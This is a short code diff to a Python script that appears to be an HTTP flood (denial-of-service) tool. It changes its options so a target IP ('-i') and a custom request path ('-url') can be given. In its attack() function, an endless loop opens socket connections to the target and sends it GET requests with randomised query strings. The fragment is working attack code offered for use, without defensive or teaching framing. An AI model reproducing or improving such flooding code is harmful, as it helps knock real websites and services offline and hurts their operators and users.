@@ -10,13 +10,14 @@ import time
 ip = ""
 port = 80
 period = 10
+url = " /?=" + str(random.randint(0,100))
 for n,args in enumerate(sys.argv):
-    if args=="-url":
+    if args=="-i":
         ip = str(sys.argv[n+1])
     if args=="-p":
         port = int(sys.argv[n+1])
-    if args=="-t":
-        period = int(sys.argv[n+1])
+    if args=="-url":
+        url = str(sys.argv[n+1])
 
 Choice = random.choice
 
@@ -97,7 +98,7 @@ def attack():
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET" + " /?=" + str(random.randint(0,100)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
